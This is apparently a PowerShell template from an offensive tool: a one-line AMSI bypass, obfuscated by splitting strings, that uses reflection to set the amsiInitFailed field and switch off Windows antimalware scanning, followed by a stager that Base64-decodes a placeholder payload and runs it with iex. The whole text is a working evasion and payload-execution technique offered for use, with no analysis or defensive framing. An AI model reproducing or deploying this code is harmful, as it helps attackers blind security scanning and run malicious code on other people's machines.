#AMSI Bypass as per bloodhound slack aggressor chat (probably cobbr)

[Ref].Assembly.GetType("System.Man"+"agement.Aut"+"omatio"+"n.Ams"+"iUtils").GetField("ams"+"iInitFai"+"led","NonP"+"ublic,St"+"atic").SetValue($null,$true); [Text.Encoding]::UTF8.GetString([Convert]:FromBase64String("{{.ENCODED_PAYLOAD}}")) | iex;